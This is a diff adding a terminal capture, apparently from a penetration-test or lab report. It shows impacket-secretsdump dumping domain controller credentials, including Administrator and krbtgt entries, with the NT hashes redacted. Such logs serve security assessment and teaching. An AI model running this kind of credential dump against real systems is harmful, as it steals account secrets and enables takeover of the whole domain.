@@ -1,0 +1,12 @@
+└─$ impacket-secretsdump -outputfile Trilocor_hashes -just-dc TRILOCOR/svc_trilocorsync@172.16.139.3
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<-REDACTED->
+Guest:501:aad3b435b51404eeaad3b435b51404ee:<-REDACTED->
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<-REDACTED->
+trilocor.local\avazquez:1724:aad3b435b51404eeaad3b435b51404ee:<-REDACTED->
+trilocor.local\pfalcon:1725:aad3b435b51404eeaad3b435b51404ee:<-REDACTED->
+trilocor.local\fanthony:1726:aad3b435b51404eeaad3b435b51404ee:<-REDACTED->
